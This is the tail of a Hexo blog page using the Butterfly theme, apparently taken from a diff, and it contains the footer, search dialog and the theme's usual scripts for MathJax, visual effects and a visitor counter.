13:23:22">2021-11-12</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By One</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.2
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
+            const target = node.parentNode
+            if (target.nodeName.toLowerCase() === 'li') {
+              target.parentNode.classList.add('has-jax')
+            } else {
+              target.classList.add('has-jax')
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
